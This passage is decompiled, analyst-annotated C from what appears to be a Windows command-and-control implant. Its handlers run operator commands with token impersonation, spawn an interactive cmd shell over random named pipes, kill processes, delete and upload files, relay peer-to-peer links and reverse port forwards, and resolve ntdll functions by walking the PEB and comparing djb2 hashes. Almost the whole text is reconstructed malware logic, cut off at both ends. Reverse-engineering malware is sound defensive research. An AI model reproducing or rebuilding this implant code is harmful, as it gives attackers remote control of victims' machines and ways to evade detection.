    local_18 = (uint *)heap_alloc(local_4c[2]);
    if (local_18 != (uint *)0x0) {
      local_1c = (*(code *)g_syscall_table[4])(5,local_18,local_4c[2],local_4c + 2);
    }
  }
  local_40 = local_18;
  if (local_1c < 0) {
    binary_buffer_write_byte(param_4,1);
    binary_buffer_write_uint32(param_4,0x57);
  }
  else {
    binary_buffer_write_byte(param_4,1);
    local_20 = 0;
    local_30 = binary_buffer_get_size((longlong)param_4);
    binary_buffer_write_uint32(param_4,0);
    if ((*(short *)(*(longlong *)*param_1 + 0x20) == 5) &&
       (*(short *)(*(longlong *)*param_1 + 0x22) == 1)) {
      local_24 = 0x400;
    }
    else {
      local_24 = 0x1000;
    }
    while( true ) {
      local_4c[1] = 0;
      local_25 = 10;
      local_3a0[0] = 0;
      local_3a0[1] = 0;
      puVar2 = local_390;
      for (lVar1 = 0x1e; lVar1 != 0; lVar1 = lVar1 + -1) {
        *puVar2 = 0;
        puVar2 = puVar2 + 1;
      }
      *(undefined4 *)puVar2 = 0;
      local_4c[0] = 0x104;
      local_290[0] = 0;
      local_290[1] = 0;
      puVar2 = local_280;
      for (lVar1 = 0x1e; lVar1 != 0; lVar1 = lVar1 + -1) {
        *puVar2 = 0;
        puVar2 = puVar2 + 1;
      }
      *(undefined4 *)puVar2 = 0;
      local_50 = 0x104;
      local_180[0] = 0;
      local_180[1] = 0;
      puVar2 = local_170;
      for (lVar1 = 0x1e; lVar1 != 0; lVar1 = lVar1 + -1) {
        *puVar2 = 0;
        puVar2 = puVar2 + 1;
      }
      *(undefined4 *)puVar2 = 0;
      local_3d0._4_12_ = SUB1612((undefined1  [16])0x0,4);
      local_3d0._0_4_ = 0x30;
      local_3d0._8_8_ = 0;
      local_3c0 = ZEXT416(0) << 0x40;
      local_3b0 = ZEXT816(0);
      local_34 = 0;
      local_58 = 0;
      local_60 = 0;
      local_68 = 0;
      local_70 = *(undefined8 *)(local_18 + 0x14);
      local_1c = (*(code *)g_syscall_table[5])(&local_60,local_24,local_3d0,&local_70);
      if (-1 < local_1c) {
        local_78 = 0;
        local_1c = (*(code *)g_syscall_table[3])(local_60,0x1a,&local_78,8,0);
        if (-1 < local_1c) {
          local_25 = local_78 == 0;
        }
        local_1c = (*(code *)g_syscall_table[6])(local_60,8,&local_58);
        if (-1 < local_1c) {
          local_34 = FUN_35d4546aa(local_58,local_290,local_4c,local_180,&local_50,local_4c + 1);
        }
      }
      if (*(longlong *)(local_18 + 0x10) != 0) {
        string_concat(*(undefined8 *)(local_18 + 0x10),(uint)(ushort)local_18[0xe],
                      (longlong)local_3a0,0x104);
        binary_buffer_write_uint16(param_4,(short)*(undefined8 *)(local_18 + 0x14));
        binary_buffer_write_uint16(param_4,(short)*(undefined8 *)(local_18 + 0x16));
        binary_buffer_write_uint16(param_4,(short)local_18[0x19]);
        binary_buffer_write_byte(param_4,local_25);
        binary_buffer_write_byte(param_4,(char)local_4c[1]);
        binary_buffer_write_string(param_4,local_180);
        binary_buffer_write_string(param_4,local_290);
        binary_buffer_write_string(param_4,local_3a0);
        local_20 = local_20 + 1;
        memset_wrapper(local_3a0,0,(ulonglong)(ushort)((ushort)local_18[0xe] >> 1));
        memset_wrapper(local_290,0,(ulonglong)local_4c[0]);
        memset_wrapper(local_180,0,(ulonglong)local_50);
      }
      if (local_60 != 0) {
        (*(code *)*g_syscall_table)(local_60);
        local_60 = 0;
      }
      if (local_58 != 0) {
        (*(code *)*g_syscall_table)(local_58);
        local_58 = 0;
      }
      if (*local_18 == 0) break;
      local_18 = (uint *)((longlong)local_18 + (ulonglong)*local_18);
    }
    if (local_40 != (uint *)0x0) {
      heap_realloc((longlong *)&local_40,local_4c[2]);
    }
    binary_buffer_reset((longlong)param_4,local_30,local_20);
  }
  return;
}



/* cmd_23_revert_to_self @ 35d44afa0 */

void cmd_23_revert_to_self(undefined8 param_1,undefined4 param_2,int *param_3,int *param_4)

{
  undefined4 uVar1;
  
  uVar1 = binary_reader_read_uint32(param_3);
  binary_buffer_write_uint32(param_4,uVar1);
  binary_buffer_write_uint32(param_4,param_2);
  (**(code **)(g_win32_api_table + 0x228))();
  return;
}



/* cmd_42_kill_process @ 35d44affa */

void cmd_42_kill_process(undefined8 param_1,undefined4 param_2,int *param_3,int *param_4)

{
  uint uVar1;
  longlong local_78;
  ulonglong local_70 [2];
  undefined1 local_60 [16];
  undefined1 local_50 [16];
  undefined1 local_40 [16];
  undefined4 local_24;
  int local_20;
  undefined4 local_1c;
  ulonglong local_18;
  
  uVar1 = binary_reader_read_uint32(param_3);
  local_18 = (ulonglong)uVar1;
  local_1c = binary_reader_read_uint32(param_3);
  binary_buffer_write_uint32(param_4,local_1c);
  local_60._4_12_ = SUB1612((undefined1  [16])0x0,4);
  local_60._0_4_ = 0x30;
  local_60._8_8_ = 0;
  local_50 = ZEXT416(0) << 0x40;
  local_40 = ZEXT816(0);
  local_70[1] = 0;
  local_70[0] = local_18;
  local_78 = 0;
  local_20 = (*(code *)g_syscall_table[5])(&local_78,1,local_60,local_70);
  if (local_20 < 0) {
    local_24 = (*(code *)g_syscall_table[0xf])(local_20);
    binary_buffer_write_uint32(param_4,0x1111ffff);
    binary_buffer_write_uint32(param_4,local_24);
  }
  else {
    binary_buffer_write_uint32(param_4,param_2);
    (*(code *)g_syscall_table[9])(local_78,0);
    binary_buffer_write_uint32(param_4,(int)local_18);
  }
  if (local_78 != 0) {
    (*(code *)*g_syscall_table)(local_78);
  }
  return;
}



/*
 * cmd_43_execute_command @ 35d44b1ba
 *
 * Executes a command with stdout/stderr capture. 3-tier fallback:
 *   1. CreateProcessA (standard) with CREATE_NO_WINDOW (0x08000000)
 *   2. CreateProcessAsUserA (if impersonation token held from cmd 22)
 *   3. CreateProcessWithTokenW (token-based, MultiByteToWideChar conversion)
 * Stdin/stdout redirected through anonymous pipes for output capture.
 * Output sent back to C2 in the next beacon cycle.
 */

void cmd_43_execute_command(longlong *param_1,undefined4 param_2,int *param_3,int *param_4)

{
  longlong lVar1;
  undefined8 *puVar2;
  longlong unaff_GS_OFFSET;
  undefined8 in_stack_fffffffffffffe50;
  undefined4 uVar3;
  undefined8 in_stack_fffffffffffffe58;
  undefined4 uVar5;
  ulonglong uVar4;
  undefined8 in_stack_fffffffffffffe60;
  undefined4 uVar6;
  undefined8 local_170 [2];
  ushort local_160;
  undefined4 local_134;
  undefined2 local_130;
  undefined8 local_120;
  longlong local_118;
  longlong local_110;
  longlong local_108;
  undefined4 local_100 [2];
  undefined8 local_f8;
  undefined4 local_f0;
  longlong local_e0;
  longlong local_d8;
  undefined8 local_d0 [7];
  undefined4 local_94;
  undefined2 local_90;
  undefined8 local_80;
  longlong local_78;
  longlong local_70;
  undefined1 local_60 [16];
  undefined8 local_50;
  uint local_44;
  longlong local_40;
  undefined4 local_34;
  int local_30;
  undefined4 local_2c;
  undefined8 *local_28;
  undefined4 local_20;
  uint local_1c;
  uint local_18;
  int local_14;
  
  uVar5 = (undefined4)((ulonglong)in_stack_fffffffffffffe58 >> 0x20);
  uVar3 = (undefined4)((ulonglong)in_stack_fffffffffffffe50 >> 0x20);
  uVar6 = (undefined4)((ulonglong)in_stack_fffffffffffffe60 >> 0x20);
  local_18 = binary_reader_read_byte(param_3);
  local_18 = local_18 & 0xff;
  local_1c = binary_reader_read_byte(param_3);
  local_1c = local_1c & 0xff;
  local_20 = binary_reader_read_uint32(param_3);
  local_44 = 0;
  local_28 = (undefined8 *)FUN_35d44f62e(param_3,&local_44);
  local_2c = binary_reader_read_uint32(param_3);
  local_60 = (undefined1  [16])0x0;
  local_50 = 0;
  puVar2 = local_d0;
  for (lVar1 = 0xd; lVar1 != 0; lVar1 = lVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  local_d0[0]._0_4_ = 0x68;
  local_94 = 0x101;
  local_90 = 0;
  local_d8 = 0;
  local_e0 = 0;
  if (local_18 != 0) {
    local_100[0] = 0x18;
    local_f8 = 0;
    local_f0 = 1;
    (**(code **)(g_win32_api_table + 0x20))(&local_d8,&local_e0,local_100,0);
    local_70 = local_e0;
    local_78 = local_e0;
    local_80 = 0;
  }
  local_14 = 0;
  if ((local_1c == 0) || (DAT_35d459030 == 0)) {
    local_14 = (**(code **)(g_win32_api_table + 0x28))
                         (0,local_28,0,0,CONCAT44(uVar3,1),CONCAT44(uVar5,local_20) | 0x8000000,0,0,
                          local_d0,local_60);
  }
  else {
    uVar4 = CONCAT44(uVar5,1);
    local_14 = (**(code **)(g_win32_api_table + 0x248))
                         (DAT_35d459030,0,local_28,0,0,uVar4,CONCAT44(uVar6,local_20) | 0x8000000,0,
                          0,local_d0,local_60);
    if ((local_14 == 0) && (*(longlong *)(g_win32_api_table + 0x250) != 0)) {
      puVar2 = local_170;
      for (lVar1 = 0xd; lVar1 != 0; lVar1 = lVar1 + -1) {
        *puVar2 = 0;
        puVar2 = puVar2 + 1;
      }
      local_170[0]._0_4_ = 0x68;
      local_134 = local_94;
      local_130 = local_90;
      local_110 = local_70;
      local_118 = local_78;
      local_120 = local_80;
      uVar4 = uVar4 & 0xffffffff00000000;
      local_30 = (**(code **)(g_win32_api_table + 0x188))(0,0,local_28,0xffffffff,0,uVar4);
      uVar3 = (undefined4)(uVar4 >> 0x20);
      if (0 < local_30) {
        lVar1 = heap_alloc(local_30 * 2);
        local_108 = lVar1;
        if (lVar1 != 0) {
          (**(code **)(g_win32_api_table + 0x188))
                    (0,0,local_28,0xffffffff,lVar1,CONCAT44(uVar3,local_30));
          local_14 = (**(code **)(g_win32_api_table + 0x250))
                               (DAT_35d459030,1,0,local_108,
                                CONCAT44((int)((ulonglong)lVar1 >> 0x20),local_20) | 0x8000000,0,0,
                                local_170,local_60);
          heap_realloc(&local_108,local_30 * 2);
        }
      }
    }
  }
  if (local_14 == 0) {
    if (local_d8 != 0) {
      (*(code *)*g_syscall_table)(local_d8);
      local_d8 = 0;
    }
    if (local_e0 != 0) {
      (*(code *)*g_syscall_table)(local_e0);
      local_e0 = 0;
    }
    binary_buffer_write_uint32(param_4,local_2c);
    binary_buffer_write_uint32(param_4,0x1111ffff);
    local_34 = 0x30;
    local_40 = *(longlong *)(unaff_GS_OFFSET + 0x30);
    binary_buffer_write_uint32(param_4,*(undefined4 *)(local_40 + 0x68));
  }
  else {
    FUN_35d44e05e(local_170,*(longlong **)(*param_1 + 0x20),local_2c,3,1,local_60._0_8_,
                  (short)local_50,local_d8,local_e0);
    binary_buffer_write_uint32(param_4,local_2c);
    binary_buffer_write_uint32(param_4,param_2);
    binary_buffer_write_uint32(param_4,(uint)local_160);
    binary_buffer_write_byte(param_4,(char)local_18);
    binary_buffer_write_bytes(param_4,local_28,local_44);
    (*(code *)*g_syscall_table)(local_60._8_8_);
    local_60._8_8_ = 0;
    if (local_18 == 0) {
      (*(code *)*g_syscall_table)(local_60._0_8_);
    }
  }
  return;
}



/* cmd_04_get_cwd @ 35d44b874 */

void cmd_04_get_cwd(undefined8 param_1,undefined4 param_2,int *param_3,int *param_4)

{
  longlong lVar1;
  undefined8 *puVar2;
  longlong unaff_GS_OFFSET;
  undefined8 local_130;
  undefined8 local_128;
  undefined8 local_120 [31];
  longlong local_28;
  undefined4 local_1c;
  undefined4 local_18;
  uint local_14;
  
  local_130 = 0;
  local_128 = 0;
  puVar2 = local_120;
  for (lVar1 = 0x1e; lVar1 != 0; lVar1 = lVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined4 *)puVar2 = 0;
  local_14 = (**(code **)(g_win32_api_table + 0x98))(0x104,&local_130);
  local_18 = binary_reader_read_uint32(param_3);
  binary_buffer_write_uint32(param_4,local_18);
  if (local_14 == 0) {
    binary_buffer_write_uint32(param_4,0x1111ffff);
    local_1c = 0x30;
    local_28 = *(longlong *)(unaff_GS_OFFSET + 0x30);
    binary_buffer_write_uint32(param_4,*(undefined4 *)(local_28 + 0x68));
  }
  else {
    binary_buffer_write_uint32(param_4,param_2);
    binary_buffer_write_bytes(param_4,&local_130,local_14);
  }
  return;
}



/* cmd_17_delete_file @ 35d44b994 */

void cmd_17_delete_file(undefined8 param_1,undefined4 param_2,int *param_3,int *param_4)

{
  byte bVar1;
  longlong unaff_GS_OFFSET;
  uint local_34;
  longlong local_30;
  undefined4 local_28;
  uint local_24;
  uint local_20;
  undefined4 local_1c;
  longlong local_18;
  int local_c;
  
  local_34 = 0;
  local_18 = FUN_35d44f62e(param_3,&local_34);
  local_1c = binary_reader_read_uint32(param_3);
  binary_buffer_write_uint32(param_4,local_1c);
  local_20 = (**(code **)(g_win32_api_table + 0xc0))(local_18);
  local_c = 0;
  if ((local_20 == 0xffffffff) || ((local_20 & 0x10) == 0)) {
    bVar1 = 0;
  }
  else {
    bVar1 = 1;
  }
  local_24 = (uint)bVar1;
  if (local_24 == 0) {
    local_c = (**(code **)(g_win32_api_table + 0x50))(local_18);
  }
  else {
    local_c = (**(code **)(g_win32_api_table + 0x1a0))(local_18);
  }
  if (local_c == 0) {
    binary_buffer_write_uint32(param_4,0x1111ffff);
    local_28 = 0x30;
    local_30 = *(longlong *)(unaff_GS_OFFSET + 0x30);
    binary_buffer_write_uint32(param_4,*(undefined4 *)(local_30 + 0x68));
  }
  else {
    binary_buffer_write_uint32(param_4,param_2);
    binary_buffer_write_byte(param_4,(char)local_24);
  }
  return;
}



/*
 * cmd_71_spawn_interactive_shell @ 35d44bacc
 *
 * Spawns an interactive process (typically cmd.exe) with I/O redirected
 * through a named pipe: \\.\pipe\%08lx (random 32-bit hex name).
 * The operator writes stdin via cmd 72 (write_stdin_to_pipe) and reads
 * stdout/stderr through the beacon response. Runs as a tracked job in
 * the job tracker subsystem.
 */

void cmd_71_spawn_interactive_shell(longlong *param_1,undefined8 param_2,int *param_3,int *param_4)

{
  longlong lVar1;
  undefined8 *puVar2;
  longlong unaff_GS_OFFSET;
  undefined8 in_stack_fffffffffffffe98;
  undefined4 uVar4;
  undefined8 uVar3;
  undefined8 in_stack_fffffffffffffea0;
  uint uVar6;
  ulonglong uVar5;
  undefined8 local_140 [5];
  longlong local_118;
  undefined4 local_110 [2];
  undefined8 local_108;
  undefined4 local_100;
  undefined8 local_f0 [7];
  undefined4 local_b4;
  undefined2 local_b0;
  undefined8 local_a0;
  undefined8 local_98;
  undefined8 local_90;
  undefined1 local_80 [16];
  undefined8 local_70;
  uint local_5c;
  longlong local_58;
  undefined4 local_50;
  int local_4c;
  undefined8 local_48;
  longlong local_40;
  undefined8 local_38;
  longlong local_30;
  undefined4 local_28;
  undefined4 local_24;
  longlong local_20;
  undefined4 local_14;
  
  uVar4 = (undefined4)((ulonglong)in_stack_fffffffffffffe98 >> 0x20);
  uVar6 = (uint)((ulonglong)in_stack_fffffffffffffea0 >> 0x20);
  local_14 = binary_reader_read_uint32(param_3);
  local_5c = 0;
  local_20 = FUN_35d44f62e(param_3,&local_5c);
  local_24 = binary_reader_read_uint32(param_3);
  local_80 = (undefined1  [16])0x0;
  local_70 = 0;
  puVar2 = local_f0;
  for (lVar1 = 0xd; lVar1 != 0; lVar1 = lVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  local_f0[0]._0_4_ = 0x68;
  local_b4 = 0x101;
  local_b0 = 0;
  local_110[0] = 0x18;
  local_108 = 0;
  local_100 = 1;
  local_28 = prng_next();
  local_118 = heap_alloc(0x12);
  (**(code **)(g_win32_api_table + 0x260))(local_118,0x12,"\\\\.\\pipe\\%08lx",local_28);
  uVar3 = CONCAT44(uVar4,0x4000);
  local_30 = (**(code **)(g_win32_api_table + 0x18))
                       (local_118,0x40000001,0,1,0x4000,uVar3,(ulonglong)uVar6 << 0x20,local_110);
  uVar5 = 0;
  uVar3 = CONCAT44((int)((ulonglong)uVar3 >> 0x20),0x40000080);
  local_38 = (**(code **)(g_win32_api_table + 0x10))(local_118,0x100002,0,local_110,3,uVar3,0);
  uVar4 = (undefined4)((ulonglong)uVar3 >> 0x20);
  local_28 = prng_next();
  (**(code **)(g_win32_api_table + 0x260))(local_118,0x12,"\\\\.\\pipe\\%08lx",local_28);
  uVar3 = CONCAT44(uVar4,0x4000);
  local_40 = (**(code **)(g_win32_api_table + 0x18))
                       (local_118,0x40000002,0,1,0x4000,uVar3,uVar5 & 0xffffffff00000000,local_110);
  uVar3 = CONCAT44((int)((ulonglong)uVar3 >> 0x20),0x40000080);
  local_48 = (**(code **)(g_win32_api_table + 0x10))(local_118,0x100001,0,local_110,3,uVar3,0);
  uVar4 = (undefined4)((ulonglong)uVar3 >> 0x20);
  heap_realloc(&local_118,0x12);
  local_a0 = local_48;
  local_98 = local_38;
  local_90 = local_38;
  local_4c = (**(code **)(g_win32_api_table + 0x28))
                       (0,local_20,0,0,1,CONCAT44(uVar4,0x8000000),0,0,local_f0,local_80);
  (*(code *)*g_syscall_table)(local_38);
  (*(code *)*g_syscall_table)(local_48);
  if (local_4c == 0) {
    if (local_30 != 0) {
      (*(code *)*g_syscall_table)(local_30);
      local_30 = 0;
    }
    if (local_40 != 0) {
      (*(code *)*g_syscall_table)(local_40);
      local_40 = 0;
    }
    binary_buffer_write_uint32(param_4,local_14);
    binary_buffer_write_uint32(param_4,0x8437);
    binary_buffer_write_byte(param_4,4);
    binary_buffer_write_byte(param_4,2);
    local_50 = 0x30;
    local_58 = *(longlong *)(unaff_GS_OFFSET + 0x30);
    binary_buffer_write_uint32(param_4,*(undefined4 *)(local_58 + 0x68));
  }
  else {
    FUN_35d44e05e(local_140,*(longlong **)(*param_1 + 0x20),local_14,4,1,local_80._0_8_,
                  (short)local_70,local_30,local_40);
    binary_buffer_write_uint32(param_4,local_14);
    binary_buffer_write_uint32(param_4,0x8437);
    binary_buffer_write_byte(param_4,4);
    binary_buffer_write_byte(param_4,0);
  }
  return;
}



/* cmd_72_write_stdin_to_pipe @ 35d44c00c */

void cmd_72_write_stdin_to_pipe(longlong *param_1,undefined8 param_2,int *param_3)

{
  code *pcVar1;
  bool bVar2;
  uint uVar3;
  int *piVar4;
  longlong lVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  undefined4 local_34;
  uint local_30;
  undefined4 local_2c;
  longlong local_28;
  int local_20;
  int local_1c;
  
  local_20 = binary_reader_read_uint32(param_3);
  local_30 = 0;
  local_28 = FUN_35d44f62e(param_3,&local_30);
  local_2c = binary_reader_read_uint32(param_3);
  local_1c = 0;
  while( true ) {
    uVar7 = (ulonglong)local_1c;
    uVar6 = FUN_35d456d10(*(longlong *)(*param_1 + 0x20));
    if (uVar6 <= uVar7) {
      return;
    }
    piVar4 = (int *)FUN_35d456400(*(longlong **)(*param_1 + 0x20),(longlong)local_1c);
    if (((local_20 == *piVar4) &&
        (lVar5 = FUN_35d456400(*(longlong **)(*param_1 + 0x20),(longlong)local_1c),
        *(short *)(lVar5 + 6) == 1)) &&
       (lVar5 = FUN_35d456400(*(longlong **)(*param_1 + 0x20),(longlong)local_1c),
       *(longlong *)(lVar5 + 0x20) != 0)) {
      bVar2 = true;
    }
    else {
      bVar2 = false;
    }
    uVar3 = local_30;
    if (bVar2) break;
    local_1c = local_1c + 1;
  }
  local_34 = 0;
  pcVar1 = *(code **)(g_win32_api_table + 0x200);
  lVar5 = FUN_35d456400(*(longlong **)(*param_1 + 0x20),(longlong)local_1c);
  (*pcVar1)(*(undefined8 *)(lVar5 + 0x20),local_28,uVar3,&local_34,0);
  return;
}



/* cmd_10_set_sleep_jitter @ 35d44c172 */

void cmd_10_set_sleep_jitter(longlong *param_1,undefined8 param_2,int *param_3)

{
  longlong lVar1;
  undefined4 uVar2;
  
  uVar2 = binary_reader_read_uint32(param_3);
  *(char *)(*(longlong *)(*param_1 + 8) + 0x20) = (char)uVar2;
  lVar1 = *(longlong *)(*param_1 + 8);
  uVar2 = binary_reader_read_uint32(param_3);
  *(undefined4 *)(lVar1 + 0x24) = uVar2;
  *(undefined4 *)(*param_1 + 0x70) = 0;
  return;
}



/* cmd_62_p2p_link_setup @ 35d44c1d6 */

void cmd_62_p2p_link_setup(longlong *param_1,undefined8 param_2,int *param_3,int *param_4)

{
  undefined4 uVar1;
  uint local_24;
  undefined4 local_20;
  ushort local_1a;
  longlong local_18;
  undefined4 local_10;
  undefined4 local_c;
  
  local_c = binary_reader_read_uint32(param_3);
  local_10 = binary_reader_read_uint32(param_3);
  local_24 = 0;
  local_18 = FUN_35d44f62e(param_3,&local_24);
  uVar1 = binary_reader_read_uint32(param_3);
  local_1a = (ushort)uVar1;
  local_20 = binary_reader_read_uint32(param_3);
  FUN_35d451428(*(longlong **)(*param_1 + 0x30),local_c,local_10,local_18,local_1a,param_4);
  return;
}



/* cmd_63_p2p_link_connect @ 35d44c27a */

void cmd_63_p2p_link_connect(longlong *param_1,undefined8 param_2,int *param_3,int *param_4)

{
  undefined4 uVar1;
  uint local_24;
  undefined4 local_20;
  undefined2 local_1a;
  longlong local_18;
  undefined4 local_c;
  
  local_c = binary_reader_read_uint32(param_3);
  local_24 = 0;
  local_18 = FUN_35d44f62e(param_3,&local_24);
  uVar1 = binary_reader_read_uint32(param_3);
  local_1a = (undefined2)uVar1;
  local_20 = binary_reader_read_uint32(param_3);
  FUN_35d4519aa(*(longlong **)(*param_1 + 0x30),local_c,local_18,local_1a,param_4);
  return;
}



/* cmd_64_p2p_link_data_relay @ 35d44c306 */

void cmd_64_p2p_link_data_relay(longlong *param_1,undefined8 param_2,int *param_3,int *param_4)

{
  uint local_20;
  undefined4 local_1c;
  undefined8 *local_18;
  int local_c;
  
  local_c = binary_reader_read_uint32(param_3);
  local_20 = 0;
  local_18 = (undefined8 *)FUN_35d44f62e(param_3,&local_20);
  local_1c = binary_reader_read_uint32(param_3);
  FUN_35d451bdc(*(longlong **)(*param_1 + 0x30),local_c,local_18,local_20,param_4);
  return;
}



/* cmd_65_p2p_link_write @ 35d44c380 */

void cmd_65_p2p_link_write(longlong *param_1,undefined8 param_2,int *param_3)

{
  uint local_20;
  undefined4 local_1c;
  longlong local_18;
  int local_c;
  
  local_c = binary_reader_read_uint32(param_3);
  local_20 = 0;
  local_18 = FUN_35d44f62e(param_3,&local_20);
  local_1c = binary_reader_read_uint32(param_3);
  FUN_35d4520b4(*(longlong **)(*param_1 + 0x30),local_c,local_18,local_20);
  return;
}



/* cmd_69_p2p_link_disconnect @ 35d44c3f8 */

void cmd_69_p2p_link_disconnect(longlong *param_1,undefined8 param_2,int *param_3)

{
  int iVar1;
  
  iVar1 = binary_reader_read_uint32(param_3);
  FUN_35d45232a(*(longlong **)(*param_1 + 0x30),iVar1);
  return;
}



/* cmd_70_p2p_link_close @ 35d44c438 */

void cmd_70_p2p_link_close(longlong *param_1,undefined8 param_2,int *param_3)

{
  int iVar1;
  
  iVar1 = binary_reader_read_uint32(param_3);
  FUN_35d452398(*(longlong **)(*param_1 + 0x30),iVar1);
  return;
}



/* cmd_66_p2p_link_op @ 35d44c478 */

void cmd_66_p2p_link_op(longlong *param_1,undefined8 param_2,int *param_3)

{
  int iVar1;
  
  iVar1 = binary_reader_read_uint32(param_3);
  FUN_35d452406(*(longlong **)(*param_1 + 0x30),iVar1);
  return;
}



/* cmd_67_p2p_link_op2 @ 35d44c4b8 */

void cmd_67_p2p_link_op2(longlong *param_1,undefined8 param_2,int *param_3,int *param_4)

{
  undefined4 uVar1;
  undefined4 uVar2;
  
  uVar1 = binary_reader_read_uint32(param_3);
  uVar2 = binary_reader_read_uint32(param_3);
  binary_reader_read_uint32(param_3);
  FUN_35d452486(*(longlong **)(*param_1 + 0x30),uVar1,(ushort)uVar2,param_4);
  return;
}



/* cmd_39_reverse_port_forward_relay @ 35d44c524 */

void cmd_39_reverse_port_forward_relay(longlong *param_1,undefined4 param_2,int *param_3,int *param_4)

{
  int iVar1;
  undefined4 uVar2;
  
  iVar1 = binary_reader_read_uint32(param_3);
  uVar2 = binary_reader_read_uint32(param_3);
  FUN_35d4500b4(*(longlong **)(*param_1 + 0x38),uVar2,param_2,iVar1,param_4);
  return;
}



/* cmd_33_file_upload @ 35d44c584 */

void cmd_33_file_upload(longlong *param_1,undefined8 param_2,int *param_3,int *param_4)

{
  bool bVar1;
  undefined7 extraout_var;
  undefined8 *puVar2;
  longlong unaff_GS_OFFSET;
  undefined4 local_74;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  uint local_48;
  int local_44;
  longlong local_40;
  undefined4 local_34;
  longlong local_30;
  undefined4 local_24;
  longlong local_20;
  int local_14;
  
  local_44 = binary_reader_read_uint32(param_3);
  local_48 = 0;
  local_20 = FUN_35d44f62e(param_3,&local_48);
  local_24 = binary_reader_read_uint32(param_3);
  binary_buffer_write_uint32(param_4,local_24);
  bVar1 = FUN_35d456c90(*(longlong **)(*param_1 + 0x28),&local_44);
  if ((int)CONCAT71(extraout_var,bVar1) != 0) {
    puVar2 = (undefined8 *)FUN_35d4558f0(*(longlong **)(*param_1 + 0x28),&local_44);
    local_70 = *puVar2;
    local_68 = puVar2[1];
    local_60 = puVar2[2];
    local_58 = puVar2[3];
    if ((int)local_58 == 0) {
      binary_buffer_write_uint32(param_4,0x1111ffff);
      binary_buffer_write_uint32(param_4,2);
    }
    else {
      local_14 = 0;
      local_74 = 0;
      local_30 = (**(code **)(g_win32_api_table + 0x10))(local_20,0x40000000,0,0,1,0x80,0);
      if ((local_30 != 0) && (local_30 != -1)) {
        local_14 = (**(code **)(g_win32_api_table + 0x200))
                             (local_30,local_60,local_70._4_4_,&local_74,0);
      }
      if (local_14 == 0) {
        binary_buffer_write_uint32(param_4,0x1111ffff);
        local_34 = 0x30;
        local_40 = *(longlong *)(unaff_GS_OFFSET + 0x30);
        binary_buffer_write_uint32(param_4,*(undefined4 *)(local_40 + 0x68));
      }
      else {
        binary_buffer_write_uint32(param_4,0x21);
      }
      if (local_30 != 0) {
        (*(code *)*g_syscall_table)(local_30);
        local_30 = 0;
      }
    }
    FUN_35d44ee2a(*(longlong **)(*param_1 + 0x28),local_44);
  }
  return;
}



/* cmd_9009_special @ 35d44c7fc */

void cmd_9009_special(longlong *param_1,undefined8 param_2,int *param_3)

{
  uint local_20;
  undefined4 local_1c;
  undefined8 *local_18;
  undefined4 local_10;
  int local_c;
  
  local_c = binary_reader_read_uint32(param_3);
  local_10 = binary_reader_read_uint32(param_3);
  local_20 = 0;
  local_18 = (undefined8 *)FUN_35d44f62e(param_3,&local_20);
  local_1c = binary_reader_read_uint32(param_3);
  FUN_35d44ecea(*(longlong **)(*param_1 + 0x28),local_c,local_10,local_20,local_18);
  return;
}



/* flush_pending_responses @ 35d44c886 */

void flush_pending_responses(longlong *param_1,int *param_2)

{
  binary_buffer_write_uint32(param_2,*(undefined4 *)(*(longlong *)(*param_1 + 8) + 0x24));
  binary_buffer_write_uint32(param_2,10);
  binary_buffer_write_uint32(param_2,(uint)*(byte *)(*(longlong *)(*param_1 + 8) + 0x20));
  return;
}



/* FUN_35d44cad1 @ 35d44cad1 */

int FUN_35d44cad1(byte *param_1)

{
  byte *local_res8;
  int local_c;
  
  local_c = 0x1505;
  for (local_res8 = param_1; *local_res8 != 0; local_res8 = local_res8 + 1) {
    local_c = (uint)*local_res8 + local_c * 0x21;
  }
  return local_c;
}



/* FUN_35d44cb1b @ 35d44cb1b */

void FUN_35d44cb1b(void)

{
  uint uVar1;
  longlong lVar2;
  ushort *puVar3;
  int iVar4;
  undefined8 *puVar5;
  longlong lVar6;
  longlong lVar7;
  longlong lVar8;
  longlong unaff_GS_OFFSET;
  uint local_14;
  undefined8 *local_10;
  
  if (DAT_35d459070 == 0) {
    DAT_35d459068 = *(undefined8 *)(*(longlong *)(unaff_GS_OFFSET + 0x60) + 0x30);
    puVar5 = (undefined8 *)(*(longlong *)(*(longlong *)(unaff_GS_OFFSET + 0x60) + 0x18) + 0x10);
    for (local_10 = (undefined8 *)*puVar5; local_10 != puVar5; local_10 = (undefined8 *)*local_10) {
      lVar2 = local_10[6];
      puVar3 = (ushort *)local_10[0xc];
      if ((0x11 < *(ushort *)(local_10 + 0xb)) && (puVar3 != (ushort *)0x0)) {
        if ((((*puVar3 | 0x20) == 0x6e) &&
            ((((puVar3[1] | 0x20) == 0x74 && ((puVar3[2] | 0x20) == 100)) &&
             ((puVar3[3] | 0x20) == 0x6c)))) &&
           (((puVar3[4] | 0x20) == 0x6c && (puVar3[5] == 0x2e)))) {
          lVar6 = lVar2 + (ulonglong)*(uint *)(lVar2 + *(int *)(lVar2 + 0x3c) + 0x88);
          uVar1 = *(uint *)(lVar6 + 0x20);
          lVar7 = lVar2 + (ulonglong)*(uint *)(lVar6 + 0x24);
          lVar8 = lVar2 + (ulonglong)*(uint *)(lVar6 + 0x1c);
          local_14 = 0;
          goto LAB_35d44ce47;
        }
      }
    }
LAB_35d44ce75:
    DAT_35d459070 = 1;
  }
  return;
LAB_35d44ce47:
  if (*(uint *)(lVar6 + 0x18) <= local_14) goto LAB_35d44ce75;
  iVar4 = FUN_35d44cad1((byte *)(lVar2 + (ulonglong)
                                         *(uint *)(lVar2 + (ulonglong)uVar1 +
                                                  (ulonglong)local_14 * 4)));
  if ((iVar4 == -0x3f4c7e26) && (DAT_35d459050 == 0)) {
    DAT_35d459050 =
         lVar2 + (ulonglong)
                 *(uint *)(lVar8 + (ulonglong)*(ushort *)(lVar7 + (ulonglong)local_14 * 2) * 4);
  }
  else if ((iVar4 == 0x70ba71d7) && (DAT_35d459058 == 0)) {
    DAT_35d459058 =
         lVar2 + (ulonglong)
                 *(uint *)(lVar8 + (ulonglong)*(ushort *)(lVar7 + (ulonglong)local_14 * 2) * 4);
  }
  else if ((iVar4 == -0x443686ef) && (DAT_35d459060 == 0)) {
    DAT_35d459060 =
         lVar2 + (ulonglong)
